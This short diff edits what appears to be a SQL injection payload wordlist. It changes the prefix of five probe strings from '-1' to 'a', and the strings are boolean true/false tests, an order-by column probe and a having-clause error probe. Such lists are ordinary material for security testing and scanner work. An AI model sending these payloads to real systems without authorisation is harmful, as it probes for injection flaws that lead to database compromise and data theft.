@@ -1,6 +1,6 @@
-1' and '345'='456
-1' or '345'='345
-1' and dfth=fghj#
-1' or dfth=dfgh#
-1' order by 99999999999#
+a' and '345'='456
+a' or '345'='345
+a' and dfth=fghj#
+a' or dfth=dfgh#
+a' order by 99999999999#
 \' having 1=1--
